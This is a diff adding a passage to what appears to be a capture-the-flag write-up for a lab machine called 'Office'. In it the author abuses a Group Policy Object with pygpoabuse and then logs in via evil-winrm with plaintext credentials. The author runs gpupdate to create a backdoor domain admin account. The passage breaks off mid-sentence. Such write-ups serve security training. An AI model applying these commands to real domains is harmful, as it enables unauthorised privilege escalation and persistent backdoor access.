@@ -957,4 +957,31 @@ python3 pygpoabuse.py 'office.htb'/'hhogan':'H4ppyFtW183#'  -gpo-id '31B2F340-01
 ```
 This created a task
 
-And since the user is part of 
+And since the user is part of the remote management users group i can login via winrm and update the policies manaully
+
+```python
+evil-winrm -i dc.office.htb -u hhogan -p 'H4ppyFtW183#'                               
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+
+
+*Evil-WinRM* PS C:\Users\HHogan\Documents>
+```
+Now i should have a backdoor admin account created for me with the creds `john:H4x00r123..`
+
+I 
